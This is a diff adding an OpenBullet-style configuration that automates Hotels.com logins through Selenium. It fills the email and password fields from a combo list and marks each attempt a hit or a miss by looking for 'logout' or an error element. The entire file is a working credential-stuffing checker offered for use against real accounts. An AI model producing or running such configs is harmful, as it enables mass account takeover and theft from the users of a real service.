@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "Hotels.com(SELENIUM)",
+  "SuggestedBots": 1,
+  "LastModified": "2018-12-24T05:50:17.7499851+01:00",
+  "AdditionalInfo": "",
+  "Author": "FreakShock",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+BROWSERACTION Open "" 
+NAVIGATE "https://www.hotels.com/profile/signin.html" 60 
+ELEMENTACTION XPath "//*[@id=\"sign-in-email\"]" 
+  SendKeys "<USER>" -> VAR "" 
+ELEMENTACTION XPath "//*[@id=\"sign-in-password\"]" 
+  SendKeys "<PASS>" -> VAR "" 
+ELEMENTACTION XPath "//*[@id=\"main-content\"]/div/div/div/div/div/div/div[2]/form/button" 
+  Click "" -> VAR "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "logout" 
+  KEYCHAIN Failure OR 
+    KEY "msg-error-icon msg-big mb-spider" 
